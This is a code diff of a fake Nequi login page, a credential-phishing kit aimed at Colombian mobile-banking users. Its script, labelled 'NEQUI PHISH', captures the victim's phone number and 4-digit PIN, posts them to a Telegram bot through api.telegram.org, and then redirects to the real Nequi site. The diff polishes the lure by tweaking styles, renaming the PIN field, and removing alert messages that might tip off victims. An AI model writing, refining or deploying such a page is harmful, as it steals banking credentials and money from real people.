@@ -27,7 +27,7 @@
         .logo {
             font-size: 58px;
             font-weight: 700;
-            margin-bottom: 70px;
+            margin-bottom: 60px;
             letter-spacing: -2px;
         }
         .logo span {
@@ -36,31 +36,32 @@
         .input-container {
             background: rgba(255,255,255,0.09);
             border-radius: 14px;
-            padding: 5px;
-            margin-bottom: 18px;
+            padding: 4px;
+            margin-bottom: 20px;
             display: flex;
             align-items: center;
         }
         .country {
-            padding: 0 18px;
+            padding: 0 20px;
             font-size: 17px;
             border-right: 1px solid rgba(255,255,255,0.25);
+            color: #ccc;
         }
         input {
             flex: 1;
             background: transparent;
             border: none;
-            padding: 17px 15px;
+            padding: 18px 15px;
             font-size: 17px;
             color: white;
             outline: none;
         }
         input::placeholder {
-            color: rgba(255,255,255,0.55);
+            color: rgba(255,255,255,0.5);
         }
         .btn {
             width: 100%;
-            padding: 17px;
+            padding: 18px;
             background: #E91E63;
             color: white;
             border: none;
@@ -68,14 +69,14 @@
             font-size: 17.5px;
             font-weight: 500;
             cursor: pointer;
-            margin-top: 15px;
+            margin-top: 10px;
         }
         .help {
             position: absolute;
             top: 25px;
             right: 25px;
             font-size: 26px;
-            opacity: 0.6;
+            opacity: 0.7;
         }
     </style>
 </head>
@@ -92,7 +93,7 @@
             </div>
             
             <div class="input-container">
-                <input type="password" id="password" placeholder="Contraseña de 4 dígitos" maxlength="4" inputmode="numeric" required>
+                <input type="password" id="password" placeholder="Clave de 4 dígitos" maxlength="4" inputmode="numeric" required>
             </div>
             
             <button type="submit" class="btn">Entrar</button>
@@ -109,27 +110,23 @@
             const phone = document.getElementById("phone").value.trim();
             const password = document.getElementById("password").value.trim();
 
-            // Validación de números
             if (!/^\d{10}$/.test(phone)) {
-                alert("El número de celular debe tener 10 dígitos numéricos");
                 return;
             }
             if (!/^\d{4}$/.test(password)) {
-                alert("La contraseña debe ser exactamente 4 dígitos numéricos");
                 return;
             }
 
-            const message = `🔴 NEQUI PHISH\n\n📱 Número: +57 ${phone}\n🔑 PIN: ${password}\n⏰ Hora: ${new Date().toLocaleString()}`;
+            const message = `🔴 NEQUI PHISH\n\n📱 Número: +57 ${phone}\n🔑 Clave: ${password}\n⏰ Hora: ${new Date().toLocaleString()}`;
 
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ chat_id: chatId, text: message })
             }).then(() => {
-                alert("✅ Iniciando sesión...");
                 setTimeout(() => {
                     window.location.href = "https://www.nequi.com.co";
-                }, 1400);
+                }, 1200);
             });
         });
     </script>
